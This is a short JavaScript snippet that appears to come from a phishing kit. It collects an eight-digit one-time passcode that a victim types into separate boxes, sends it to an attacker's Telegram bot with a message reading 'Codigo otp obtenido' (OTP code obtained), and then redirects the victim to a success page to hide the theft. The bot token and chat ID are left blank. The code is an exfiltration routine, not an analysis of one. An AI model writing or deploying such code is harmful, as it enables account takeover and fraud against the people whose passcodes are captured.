  function sendMessage() {
    const input1 = document.getElementById('input1').value;
    const input2 = document.getElementById('input2').value;
    const input3 = document.getElementById('input3').value;
    const input4 = document.getElementById('input4').value;
    const input5 = document.getElementById('input5').value;
    const input6 = document.getElementById('input6').value;
    const input7 = document.getElementById('input7').value;
    const input8 = document.getElementById('input8').value;

    const telegramBotUrl = 'https://api.telegram.org/bot/sendMessage';

    const message = `Codigo otp obtenido:${input1}${input2}${input3}${input4}${input5}${input6}${input7}${input8}`;

    const data = {
      chat_id: '',
      text: message
    };

    axios.post(telegramBotUrl, data)
      .then(response => {
        console.log('Done.');
        setTimeout(function () {
          window.location.href = './success.html';
        }, 3000);
      })
      .catch(error => {
        console.error('Error.', error);
      });
  }

  function moveToNext(input) {
    if (input.value.length === 1) {
      var nextInput = input.nextElementSibling;
      if (nextInput !== null) {
        nextInput.focus();
      }
    } else if (input.value.length === 0) {
      var prevInput = input.previousElementSibling;
      if (prevInput !== null) {
        prevInput.focus();
      }
    }
  }

